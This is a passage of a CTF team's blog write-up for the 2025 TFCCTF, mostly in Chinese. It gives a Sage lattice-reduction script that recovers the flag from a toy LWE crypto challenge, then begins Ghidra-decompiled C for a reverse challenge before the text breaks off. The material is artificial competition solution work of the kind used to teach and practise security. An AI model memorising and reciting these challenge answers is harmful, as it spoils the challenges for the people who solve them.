<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2025 TFCCTF SU WriteUp - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="本次 TFCCTF 我们 SU 取得了第六名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。 以下是我们 SU 本次 2025 TFCCTF的 WriteUp。"><meta property="og:type" content="blog"><meta property="og:title" content="2025 TFCCTF SU WriteUp"><meta property="og:url" content="https://team-su.github.io/posts/a92a3cc3.html"><meta property="og:site_name" content="su-team"><meta property="og:description" content="本次 TFCCTF 我们 SU 取得了第六名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。 以下是我们 SU 本次 2025 TFCCTF的 WriteUp。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://team-su.github.io/images/2025-TFCCTF/1.png"><meta property="og:image" content="https://team-su.github.io/images/2025-TFCCTF/2.png"><meta property="og:image" content="https://team-su.github.io/images/2025-TFCCTF/3.png"><meta property="og:image" content="https://team-su.github.io/images/2025-TFCCTF/4.png"><meta property="og:image" content="https://team-su.github.io/images/2025-TFCCTF/5.png"><meta property="og:image" content="https://team-su.github.io/images/2025-TFCCTF/6.png"><meta property="og:image" content="https://team-su.github.io/images/2025-TFCCTF/7.png"><meta property="og:image" content="https://team-su.github.io/images/2025-TFCCTF/8.png"><meta property="og:image" content="https://team-su.github.io/images/2025-TFCCTF/9.png"><meta property="og:image" content="https://team-su.github.io/images/2025-TFCCTF/10.png"><meta property="og:image" content="https://team-su.github.io/images/2025-TFCCTF/11.png"><meta property="og:image" content="https://team-su.github.io/images/2025-TFCCTF/12.png"><meta property="og:image" content="https://team-su.github.io/images/2025-TFCCTF/13.png"><meta property="og:image" content="https://team-su.github.io/images/2025-TFCCTF/14.png"><meta property="og:image" content="https://team-su.github.io/images/2025-TFCCTF/15.png"><meta property="og:image" content="https://team-su.github.io/images/2025-TFCCTF/16.png"><meta property="og:image" content="https://team-su.github.io/images/2025-TFCCTF/17.png"><meta property="og:image" content="https://team-su.github.io/images/2025-TFCCTF/18.png"><meta property="og:image" content="https://team-su.github.io/images/2025-TFCCTF/19.png"><meta property="og:image" content="https://team-su.github.io/images/2025-TFCCTF/20.png"><meta property="og:image" content="https://team-su.github.io/images/2025-TFCCTF/21.png"><meta property="article:published_time" content="2025-08-31T13:31:50.000Z"><meta property="article:modified_time" content="2025-08-31T15:08:20.233Z"><meta property="article:author" content="SUers"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://team-su.github.io/images/2025-TFCCTF/1.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/posts/a92a3cc3.html"},"headline":"2025 TFCCTF SU WriteUp","image":["https://team-su.github.io/images/2025-TFCCTF/1.png","https://team-su.github.io/images/2025-TFCCTF/2.png","https://team-su.github.io/images/2025-TFCCTF/3.png","https://team-su.github.io/images/2025-TFCCTF/4.png","https://team-su.github.io/images/2025-TFCCTF/5.png","https://team-su.github.io/images/2025-TFCCTF/6.png","https://team-su.github.io/images/2025-TFCCTF/7.png","https://team-su.github.io/images/2025-TFCCTF/8.png","https://team-su.github.io/images/2025-TFCCTF/9.png","https://team-su.github.io/images/2025-TFCCTF/10.png","https://team-su.github.io/images/2025-TFCCTF/11.png","https://team-su.github.io/images/2025-TFCCTF/12.png","https://team-su.github.io/images/2025-TFCCTF/13.png","https://team-su.github.io/images/2025-TFCCTF/14.png","https://team-su.github.io/images/2025-TFCCTF/15.png","https://team-su.github.io/images/2025-TFCCTF/16.png","https://team-su.github.io/images/2025-TFCCTF/17.png","https://team-su.github.io/images/2025-TFCCTF/18.png","https://team-su.github.io/images/2025-TFCCTF/19.png","https://team-su.github.io/images/2025-TFCCTF/20.png","https://team-su.github.io/images/2025-TFCCTF/21.png"],"datePublished":"2025-08-31T13:31:50.000Z","dateModified":"2025-08-31T15:08:20.233Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"本次 TFCCTF 我们 SU 取得了第六名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。 以下是我们 SU 本次 2025 TFCCTF的 WriteUp。"}</script><link rel="canonical" href="https://team-su.github.io/posts/a92a3cc3.html"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a><a class="navbar-item" href="https://forms.office.com/r/YxbUJJ3i78">Join</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="RSS Feed" href="/atom.xml"><i class="fas fa-rss"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2025-08-31T13:31:50.000Z" title="2025/8/31 21:31:50">2025-08-31</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-08-31T15:08:20.233Z" title="2025/8/31 23:08:20">2025-08-31</time></span><span class="level-item">2 hours read (About 16196 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">2025 TFCCTF SU WriteUp</h1><div class="content"><p>本次 TFCCTF 我们 SU 取得了第六名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：<a href="mailto:&#115;&#x75;&#101;&#x72;&#x73;&#95;&#120;&#x63;&#x74;&#x66;&#64;&#x31;&#50;&#x36;&#46;&#x63;&#111;&#109;">suers_xctf@126.com</a> 或者直接联系baozongwi QQ:2405758945。</p>
<p>以下是我们 SU 本次 2025 TFCCTF的 WriteUp。</p>
<span id="more"></span>

<hr>
<p><img src="../images/2025-TFCCTF/1.png" alt="img"></p>
<p>本次 TFCCTF 我们 SU 取得了第六名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：<a href="mailto:&#115;&#117;&#x65;&#114;&#x73;&#x5f;&#x78;&#99;&#116;&#102;&#64;&#x31;&#x32;&#54;&#46;&#x63;&#111;&#x6d;">suers_xctf@126.com</a> 或者直接联系baozongwi QQ:2405758945。</p>
<p>以下是我们 SU 本次 2025 TFCCTF的 WriteUp。</p>
<div class="toc">

<!-- toc -->

<ul>
<li><a href="#crypto">Crypto</a><ul>
<li><a href="#deez-errors">DEEZ ERRORS</a></li>
<li><a href="#mini-aura">MINI AURA</a></li>
<li><a href="#why-the-bear-has-no-tail">WHY THE BEAR HAS NO TAIL</a></li>
</ul>
</li>
<li><a href="#pwn">Pwn</a><ul>
<li><a href="#slots">SLOTS</a></li>
<li><a href="#mucusky">MUCUSKY</a></li>
</ul>
</li>
<li><a href="#misc">Misc</a><ul>
<li><a href="#minijail">MINIJAIL</a></li>
<li><a href="#pjail">ΠJAIL</a></li>
<li><a href="#discord-shenanigans-v5">DISCORD SHENANIGANS V5</a></li>
<li><a href="#blackbox">BLACKBOX</a></li>
<li><a href="#cr00ney">CR00NEY</a></li>
<li><a href="#to-rotate-or-not-to-rotate">TO ROTATE, OR NOT TO ROTATE</a></li>
</ul>
</li>
<li><a href="#reverse">Reverse</a><ul>
<li><a href="#oxidized-intentions">OXIDIZED INTENTIONS</a></li>
<li><a href="#scratching-machine">SCRATCHING MACHINE</a></li>
<li><a href="#mccrab2">MCCRAB2</a></li>
<li><a href="#font-leagues">FONT LEAGUES</a></li>
</ul>
</li>
<li><a href="#web">Web</a><ul>
<li><a href="#webless">WEBLESS</a></li>
<li><a href="#kissfixess">KISSFIXESS</a></li>
<li><a href="#dom-notify">DOM NOTIFY</a></li>
<li><a href="#slippy">SLIPPY</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

</div>

<h1><span id="crypto">Crypto</span><a href="#crypto" class="header-anchor"></a></h1><h2><span id="deez-errors">DEEZ ERRORS</span><a href="#deez-errors" class="header-anchor"></a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long  </span><br><span class="line"><span class="keyword">import</span> random  </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag  </span><br><span class="line">  </span><br><span class="line">mod = <span class="number">0x225fd</span>  </span><br><span class="line">flag = bytes_to_long(flag)  </span><br><span class="line">e_values = [<span class="number">97491</span>, <span class="number">14061</span>, <span class="number">55776</span>]  </span><br><span class="line">S = (<span class="keyword">lambda</span> f=[flag], sk=[]: ([sk.append(f[<span class="number">0</span>] % mod) <span class="keyword">or</span> f.__setitem__(<span class="number">0</span>, f[<span class="number">0</span>] // mod) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">iter</span>(<span class="keyword">lambda</span>: f[<span class="number">0</span>], <span class="number">0</span>)],sk)[<span class="number">1</span>])()  </span><br><span class="line">S = vector(GF(mod), S)  </span><br><span class="line">  </span><br><span class="line">A_save = []  </span><br><span class="line">b_save = []  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">52</span>):  </span><br><span class="line">    A = VectorSpace(GF(mod), <span class="number">44</span>).random_element()  </span><br><span class="line">    e = random.choice(e_values)  </span><br><span class="line">    b = A * S + e  </span><br><span class="line">    <span class="comment">#print(b)  </span></span><br><span class="line">  </span><br><span class="line">    A_save.append(A)  </span><br><span class="line">    b_save.append(b)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;A_values = &#x27;</span> + <span class="built_in">str</span>(A_save) + <span class="string">&#x27; ; b_values = &#x27;</span> + <span class="built_in">str</span>(b_save))</span><br></pre></td></tr></table></figure>

<p>在这里将 flag 通过 $mod$ 进制转换为一个向量 $\pmb{s}$ 之后进行加密，根据加密的形式很显然这就是 LWE，这里的误差向量</p>
<div>
$$
\pmb{e}\in\{97491,14061,55776\}^{52},
$$
</div>

<p>而</p>
<div>
$$
97491 = 55776+41715, \quad 14061=55776-41715.
$$
</div>

<p>我们令 $d&#x3D;41715$，则有：</p>
<div>
$$
\pmb{e}=
\begin{pmatrix}
55776\\
55776\\
\vdots\\
55776
\end{pmatrix}
+
d\begin{pmatrix}
\varepsilon\_1\\
\varepsilon\_2\\
\vdots\\
\varepsilon\_{52}
\end{pmatrix}.
$$
</div>

<p>其中 $\varepsilon_i \in {-1,0,1},,(i&#x3D;1,2,\cdots,52)$，所以有：</p>
<div>
$$
\pmb{b}=\pmb{A}\pmb{s}+\pmb{e}
=\pmb{A}\pmb{s}+
\begin{pmatrix}
55776\\
55776\\
\vdots\\
55776
\end{pmatrix}
+
d\begin{pmatrix}
\varepsilon\_1\\
\varepsilon\_2\\
\vdots\\
\varepsilon\_{52}
\end{pmatrix}.
$$
</div>

<p>从而：</p>
<div>
$$
\pmb{b}-
\begin{pmatrix}
55776\\
55776\\
\vdots\\
55776
\end{pmatrix}
=
\pmb{A}\pmb{s}+
d\begin{pmatrix}
\varepsilon\_1\\
\varepsilon\_2\\
\vdots\\
\varepsilon\_{52}
\end{pmatrix}.
$$
</div>

<p>令</p>
<div>
$$
\pmb{b}'=\pmb{b}-(55776,55776,\cdots,55776)^{T}, \quad
\pmb{\varepsilon}=(\varepsilon\_1,\varepsilon\_2,\cdots,\varepsilon\_{52})^{T},
$$
</div>

<p>有：</p>
<div>
$$
\pmb{b}'=\pmb{A}\pmb{s}+d\pmb{\varepsilon}.
$$
</div>

<p>那么我们就可以将原来误差向量较大的 LWE 转换为一个误差向量中元素均在 ${-1,0,1}$ 中的 LWE：</p>
<div>
$$
d^{-1}\pmb{b}'=d^{-1}\pmb{A}\pmb{s}+\pmb{\varepsilon}.
$$
</div>

<p>因为 $\pmb{s}$ 较大，所以需要使用 <a href="https://triodelzx.github.io/2025/07/07/LWE/">LWE | Triode Field</a> 中提到的先求 HNF 再进行规约的方法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage 10.4</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choices</span><br><span class="line"></span><br><span class="line">A_values = [...]</span><br><span class="line">b_values = [...]</span><br><span class="line">e_values = [<span class="number">97491</span>, <span class="number">14061</span>, <span class="number">55776</span>]</span><br><span class="line"></span><br><span class="line">d = e_values[<span class="number">2</span>] - e_values[<span class="number">1</span>]</span><br><span class="line">mod = <span class="number">0x225fd</span></span><br><span class="line"></span><br><span class="line">b_values = [x - e_values[<span class="number">2</span>] <span class="keyword">for</span> x <span class="keyword">in</span> b_values]</span><br><span class="line"></span><br><span class="line">A = inverse(d, mod) * matrix(ZZ, A_values)</span><br><span class="line">b = inverse(d, mod) * matrix(b_values)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">len</span>(b[<span class="number">0</span>])</span><br><span class="line">B = block_matrix(ZZ, <span class="number">2</span>, <span class="number">1</span>, [[A.transpose()], [mod]])</span><br><span class="line">B_HNF = B.hermite_form(include_zero_rows=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">L = block_matrix(ZZ, <span class="number">2</span>, <span class="number">2</span>, [[B_HNF, <span class="number">0</span>], [b, d]])</span><br><span class="line"></span><br><span class="line">res = L.BKZ()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(x <span class="keyword">in</span> [-<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> v[:-<span class="number">1</span>]):</span><br><span class="line">        <span class="keyword">if</span> v[-<span class="number">1</span>] == -d:</span><br><span class="line">            e = -vector(v[:-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            e = vector(v[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        cvp = vector(b) - e</span><br><span class="line"></span><br><span class="line">        AA = matrix(Zmod(mod), A)</span><br><span class="line">        cvp = vector(Zmod(mod), cvp)</span><br><span class="line"></span><br><span class="line">        s = AA.solve_right(cvp)</span><br><span class="line"></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s[::-<span class="number">1</span>]:</span><br><span class="line">            flag = flag * mod + ZZ(i)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>

<h2><span id="mini-aura">MINI AURA</span><a href="#mini-aura" class="header-anchor"></a></h2><p>csky架构最后发现只有ghidra反编译比较成功</p>
<p>需要安装ghidra插件</p>
<p><a href="https://github.com/leommxj/ghidra_csky">https://github.com/leommxj/ghidra_csky</a></p>
<p>反编译完直接就跳到了main而且非常清晰</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">undefined4 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  FILE *__stream;</span><br><span class="line">  <span class="type">size_t</span> sVar1;</span><br><span class="line">  <span class="type">char</span> *__ptr;</span><br><span class="line">  byte *__dest;</span><br><span class="line">  <span class="type">int</span> *__dest_00;</span><br><span class="line">  <span class="type">int</span> iVar2;</span><br><span class="line">  <span class="type">char</span> *pcVar3;</span><br><span class="line">  byte *pbVar4;</span><br><span class="line">  uint uVar5;</span><br><span class="line">  byte *pbVar6;</span><br><span class="line">  uint uVar7;</span><br><span class="line">  <span class="type">bool</span> bVar8;</span><br><span class="line">  byte *pbVar9;</span><br><span class="line">  <span class="type">int</span> iVar10;</span><br><span class="line">  <span class="type">int</span> *piVar11;</span><br><span class="line">  uint uVar12;</span><br><span class="line">  uint *puVar13;</span><br><span class="line">  <span class="type">int</span> iVar14;</span><br><span class="line">  uint *puVar15;</span><br><span class="line">  uint *puVar16;</span><br><span class="line">  <span class="type">size_t</span> sVar17;</span><br><span class="line">  uint *puVar18;</span><br><span class="line">  undefined4 *puVar19;</span><br><span class="line">  uint *puStack_e4;</span><br><span class="line">  uint *puStack_e0;</span><br><span class="line">  byte local_dc [<span class="number">16</span>];</span><br><span class="line">  uint local_cc [<span class="number">12</span>];</span><br><span class="line">  uint local_9c [<span class="number">12</span>];</span><br><span class="line">  uint local_6c [<span class="number">16</span>];</span><br><span class="line">  </span><br><span class="line">  __stream = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (__stream != (FILE *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    fseek(__stream,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">    sVar1 = ftell(__stream);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">int</span>)sVar1 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      fclose(__stream);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      fseek(__stream,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">      __ptr = (<span class="type">char</span> *)<span class="built_in">malloc</span>(sVar1);</span><br><span class="line">      sVar1 = fread(__ptr,<span class="number">1</span>,sVar1,__stream);</span><br><span class="line">      fclose(__stream);</span><br><span class="line">      <span class="keyword">if</span> (sVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">        uVar12 = <span class="number">0</span>;</span><br><span class="line">        pcVar3 = __ptr;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> ((*pcVar3 != <span class="string">&#x27; &#x27;</span>) &amp;&amp; (<span class="number">4</span> &lt; (byte)(*pcVar3 - <span class="number">9U</span>))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (uVar12 &lt; sVar1) &#123;</span><br><span class="line">              pcVar3 = __ptr + (sVar1 - <span class="number">1</span>);</span><br><span class="line">              uVar7 = sVar1 - <span class="number">1</span>;</span><br><span class="line">              <span class="keyword">goto</span> LAB_00008840;</span><br><span class="line">            